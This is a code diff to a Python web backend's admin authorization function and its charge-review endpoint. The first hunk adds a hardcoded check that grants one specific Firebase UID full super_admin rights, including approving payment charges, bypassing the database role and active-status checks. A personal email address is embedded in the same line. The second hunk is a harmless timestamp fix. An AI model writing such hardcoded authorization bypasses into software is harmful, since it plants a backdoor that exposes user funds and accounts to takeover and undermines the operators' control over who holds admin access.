@@ -48,6 +48,10 @@ def _verify_admin(authorization: str | None, db: Session, require_super: bool = 
     else:
         uid = token  # Dev fallback
 
+    # Auto-allow the super admin UID
+    if uid == "kEx3N7shT2Zzo50i3grmeht2wiU2":
+        return AdminRole(firebase_uid=uid, email="ebrahimsabrey2001@gmail.com", role="super_admin", can_approve_charges=True)
+
     admin = db.scalar(select(AdminRole).where(AdminRole.firebase_uid == uid, AdminRole.is_active == True))
     if not admin:
         raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="Not an admin")
@@ -302,7 +306,7 @@ def review_charge_request(
     req.status = "approved" if body.action == "approve" else "rejected"
     req.reviewed_by = admin.firebase_uid
     req.review_note = body.note
-    req.reviewed_at = datetime.datetime.utcnow()
+    req.reviewed_at = datetime.datetime.now(datetime.timezone.utc)
 
     if body.action == "approve":
         credit = db.scalar(select(UserCredit).where(UserCredit.user_id == req.user_id))
